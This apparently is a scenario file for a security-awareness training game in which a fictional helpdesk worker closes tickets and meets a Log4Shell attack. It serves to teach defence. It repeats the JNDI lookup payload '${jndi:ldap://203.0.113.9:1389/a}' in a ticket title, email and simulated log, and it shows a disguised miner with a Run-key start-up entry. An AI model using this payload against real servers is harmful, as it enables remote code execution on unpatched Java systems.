@@ -1,0 +1,285 @@
+# Log4Shell (December 2021). One line of text in a web form made a Java server fetch and run an attacker's program.
+# A quest (QUESTS.md): the trainee works the IT helpdesk, closes one ticket safely, then meets Log4Shell in the next one.
+# No single real victim is recorded for this scene: the company, the helpdesk portal and the person are invented.
+os windows
+user Dana Okafor
+about
+  | Log4Shell (CVE-2021-44228) was a flaw in Log4j, a logging library built into thousands of Java programs: web portals, game servers, security tools. If the program wrote a piece of text containing ${jndi:ldap://…} to its log, Log4j treated it as an instruction, asked the address inside to answer, and ran what came back.
+  | Within hours of the news in December 2021, attackers were typing that text into anything that reached a log: chat messages, user names, web form titles, email subjects. Most victims saw nothing at all. Many were later found to be mining coins for the attacker.
+  | This scene is an invention: a small company's helpdesk portal that sat unpatched. The portal is fictional.
+story
+  | You are Dana Okafor, IT support at Northwind Traders. Staff report problems through HelpPoint, the company's helpdesk portal. It is a Java program that runs on the old office PC under your desk.
+  | It is mid-morning. You have closed 5 of today's 8 tickets. Three to go.
+  | Your HelpPoint sign-in is in a text file on the desktop. A to-do note there says the portal's update was put off to January.
+quota 5 8 Tickets closed today
+
+# The portal runs all day on this PC (what a normal Task Manager shows).
+run javaw.exe
+  cpu 6
+  mem 1400
+  parent services.exe
+  command javaw.exe -Xmx2G -jar C:\HelpPoint\helppoint-portal.jar
+
+# Dana's desk.
+file Desktop/helppoint-login.txt
+  at 930 200
+  | HelpPoint admin
+  | User: dana.okafor
+  | Password: Helpdesk-2026!
+file Desktop/patching-plan.txt
+  at 930 300
+  | IT to-do (training copy)
+  | - Update HelpPoint's Java libraries (Log4j 2.14.1 -> newer): postponed to January
+  | - Replace the toner in room 3
+
+# The portal: a sign-in page and the ticket pages behind it.
+page portal-login helppoint.northwind.example/admin/sign-in
+  title HelpPoint: sign in
+  brand HelpPoint
+  favorite
+  heading Sign in to HelpPoint
+  | Staff helpdesk. Sign in to work your tickets.
+  field User = dana.okafor
+  field secret Password = Helpdesk-2026!
+  button Sign in
+page solved-4301 helppoint.northwind.example/admin/tickets/4301/solved
+  title Ticket 4301 solved
+  brand HelpPoint
+  heading Ticket 4301 solved
+  | The room 2 screen is working again. Marcus Lee has been told.
+page ticket-4301 helppoint.northwind.example/admin/tickets/4301
+  title Ticket 4301
+  brand HelpPoint
+  requires portal-login
+  heading Ticket 4301
+  | A staff ticket is waiting for you.
+  section Ticket
+  row Title = Room 2 screen will not connect
+  row From = Marcus Lee (staff)
+  row Sent through = Staff form
+  row Note = The cable was loose. Fixed on site.
+  button Mark solved -> solved-4301
+
+mail notice-4301
+  from HelpPoint <helppoint@northwind.example>
+  subject New ticket 4301: Room 2 screen will not connect
+  link ticket-4301
+  | A new ticket was created in HelpPoint.
+  |
+  | Title: Room 2 screen will not connect
+  | From: Marcus Lee (staff)
+  |
+  | Open it in HelpPoint to work on it.
+
+step Ticket 6 of 8
+  look Mail: HelpPoint's message about a new ticket
+  | A new ticket has come in. This one is ordinary: close it the normal way, so you know what normal looks like.
+notify mail HelpPoint
+  | New ticket 4301: Room 2 screen will not connect
+
+step The link goes to HelpPoint
+  look the title in the subject, and the link under the message
+  when mail notice-4301
+  move Click the link in the email.
+  | The title is a plain sentence from a colleague, and the link goes to the portal at helppoint.northwind.example.
+open notice-4301
+
+step Sign in as usual
+  look the two boxes: User and Password
+  when visit ticket-4301
+  move Copy the details from helppoint-login.txt on the desktop: click a box and press any keys to type, then click “Sign in”.
+  | The portal asks you to sign in first. Remember what this page and this ticket look like.
+open ticket-4301
+
+step Check, then close
+  look the ticket: title, sender and note
+  when choose portal-login 1
+  | You are in. The title is a sentence from a colleague, and the note says what was done.
+signin portal-login
+
+step 6 of 8 done
+  look the counter in the guide: two tickets left
+  when choose ticket-4301 any
+  move Open the new email from HelpPoint in Mail.
+  | Done. Two tickets to go. And another new ticket has just arrived.
+choose ticket-4301 1
+quota +1
+
+# The lure: a ticket whose title is a lookup instruction. Its one button closes it as spam; the server log is one click on from there.
+page helppoint-log helppoint.northwind.example/admin/server-log
+  title HelpPoint: server log
+  brand HelpPoint
+  requires portal-login
+  heading Server log
+  | What the portal wrote to its log today.
+  section Earlier today
+  code [08:41:12 INFO] Ticket 4301 created: Room 2 screen will not connect
+  code [09:02:44 INFO] Ticket 4301 marked solved by dana.okafor
+  section Ticket 4302, just now
+  code [09:05:09 INFO] Ticket 4302 created from the public form
+  code [09:05:09 INFO] Title: ${jndi:ldap://203.0.113.9:1389/a}
+  code [09:05:10 INFO] javaw.exe connected to 203.0.113.9:1389 (LDAP)
+  code [09:05:11 INFO] javaw.exe downloaded a class from 203.0.113.9:8080
+  code [09:05:12 INFO] javaw.exe started a program called javaupdsvc.exe
+  note Training copy: the last three lines are what the computer recorded about the portal's Java process. Nothing is fetched.
+page solved-4302 helppoint.northwind.example/admin/tickets/4302/closed
+  title Ticket 4302 closed
+  brand HelpPoint
+  heading Ticket 4302 closed as spam
+  | The public form ticket is closed.
+  button Open the server log -> helppoint-log
+page ticket-4302 helppoint.northwind.example/admin/tickets/4302
+  title Ticket 4302
+  brand HelpPoint
+  requires portal-login
+  heading Ticket 4302
+  | A new ticket from the public web form.
+  section Ticket 4302
+  row Title = ${jndi:ldap://203.0.113.9:1389/a}
+  row From = guest@visitor-mail.invalid
+  row Sent through = Public web form
+  row Message = hi my printer is broken pls help
+  button Close as spam -> solved-4302
+mail notice-4302
+  from HelpPoint <helppoint@northwind.example>
+  subject New ticket 4302: ${jndi:ldap://203.0.113.9:1389/a}
+  link ticket-4302
+  | A new ticket was created in HelpPoint.
+  |
+  | Title: ${jndi:ldap://203.0.113.9:1389/a}
+  | From: guest@visitor-mail.invalid
+  |
+  | Open it in HelpPoint to work on it.
+notify mail HelpPoint
+  | New ticket 4302: ${jndi:ldap://203.0.113.9:1389/a}
+
+step A ticket with a strange title
+  look the subject line: it is not a sentence
+  when mail notice-4302
+  move Click the link in the email.
+  | This title is not words: it starts with ${jndi:, an instruction Log4j follows. It came from the public web form, not a colleague.
+open notice-4302
+
+step The portal has already read it
+  look the ticket's title, and where it came from
+  when visit ticket-4302
+  move Read the title, then click “Close as spam”.
+  | The portal logged the title the moment the form was sent; opening the ticket changes nothing.
+open ticket-4302
+
+step Closed as spam
+  look the counter in the guide: seven of eight
+  when choose ticket-4302 1
+  | Seven of eight. Closing a ticket does not undo what the portal already did with its title.
+choose ticket-4302 1
+quota +1
+
+step What the log shows
+  look the “Ticket 4302, just now” lines in the log
+  when choose solved-4302 1
+  move Look at what is running: click the “program running” chip under this card.
+  | The portal connected to 203.0.113.9 for an answer, then downloaded and started a program from it. That program now runs on this PC and has added a start-up entry.
+choose solved-4302 1
+
+# What the attacker's code does: a miner with a disguised name, started by the portal's Java process, with a Run entry.
+program dropper-miner javaupdsvc.exe
+  publisher none
+  signed no
+  description Background service
+  process javaupdsvc.exe
+  cpu 92
+  mem 210
+  parent javaw.exe
+  command C:\Users\Public\javaupdsvc.exe
+page solved-4303 helppoint.northwind.example/admin/tickets/4303/solved
+  title Ticket 4303 solved
+  brand HelpPoint
+  heading Ticket 4303 solved
+  | Priya Shah has been told. The portal is still slow.
+page ticket-4303 helppoint.northwind.example/admin/tickets/4303
+  title Ticket 4303
+  brand HelpPoint
+  requires portal-login
+  heading Ticket 4303
+  | A staff ticket is waiting for you. This page took 41 seconds to load.
+  section Ticket
+  row Title = Portal is crawling
+  row From = Priya Shah (staff)
+  row Sent through = Staff form
+  row Message = Nothing opens. My printer ticket is stuck.
+  section Server status
+  row Server load = 96%
+  row Page time = 41 seconds
+  row Memory in use = 1.6 GB
+  button Mark solved -> solved-4303
+mail notice-4303
+  from HelpPoint <helppoint@northwind.example>
+  subject New ticket 4303: Portal is crawling
+  link ticket-4303
+  | A new ticket was created in HelpPoint.
+  |
+  | Title: Portal is crawling
+  | From: Priya Shah (staff)
+  |
+  | Open it in HelpPoint to work on it.
+notify mail HelpPoint
+  | New ticket 4303: Portal is crawling
+launch dropper-miner
+startup HelpPointUpdater C:\Users\Public\javaupdsvc.exe
+  location HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+step Task Manager shows it
+  look the process list: javaupdsvc.exe at 92%, under javaw.exe
+  when open taskmanager
+  move Open the new email from HelpPoint, then click the link in it.
+  | javaw.exe is the portal itself and sits at about 6%: that is normal. javaupdsvc.exe is new, started by the portal, and uses 92% of the processor.
+  | It also added a start-up entry, so it returns after a restart. And a new ticket says the portal is crawling.
+open taskmanager
+
+step The last ticket, slowly
+  look the “Server status” section: 96% load, 41 seconds a page
+  when visit ticket-4303
+  move Read the whole page, including the server status. Then press “Mark solved”.
+  | The ticket is ordinary. The server under it is not: it is busy with something nobody asked it to do.
+open ticket-4303
+
+step 8 of 8, or so Dana thinks
+  look the counter: the shift is done
+  when choose ticket-4303 any
+  | All eight tickets are closed. Press Next to see what Log4Shell did.
+choose ticket-4303 1
+quota +1
+
+step What Log4Shell did
+  look the animation: the portal's processor working for the attacker
+  | The flaw needed no click and no password: one line of text in a form was enough. Here it mined coins on Dana's PC; others installed ransomware or stole data.
+attack botnet-ddos
+  | ${jndi:ldap://...} in a ticket title
+  | the portal fetched a program from outside
+  | the program mines coins on Dana's PC
+  | the coins go to the attacker's pool
+block 203.0.113.9 3333
+
+flag hard mail notice-4302
+  | The subject is a lookup instruction, not a sentence: it came from a visitor's ticket.
+flag hard section ticket-4302 1
+  | The ticket's title is ${jndi:ldap://…}: text that Log4j reads as an instruction.
+flag hard section helppoint-log 2
+  | The portal's server connected to an outside address and downloaded a program from it. An ordinary ticket never does that.
+flag hard process javaupdsvc.exe
+  | A program started by the portal's Java process, using almost all of the processor.
+flag hard startup HelpPointUpdater
+  | A Run entry that starts the program again after every restart.
+flag hard section ticket-4303 2
+  | The server is at 96% load and each page takes 41 seconds: something else is using it.
+flag hard notice taskmanager connection blocked
+  | The program tried to reach an outside address on its own: a miner calling its pool.
+flag soft file Desktop/patching-plan.txt
+  | A security update put off to January: this is why the portal still ran the flawed library. Patch first.
+flag soft file Desktop/helppoint-login.txt
+  | A password in a text file on the desktop: any program that runs can read it.
+
+lesson
+  | Keep the programs you run up to date, including the libraries inside them. Ask each vendor whether it uses Log4j, and patch first.
+  | Text typed by outsiders (forms, chat, user names, subjects) must never be treated as instructions. A title that starts with ${jndi: is an attack, whether or not anyone opens it.
+  | Servers should not reach unknown addresses: a blocked outbound connection stops the second half of this attack. A sudden slow server with a busy Java process is worth a look.
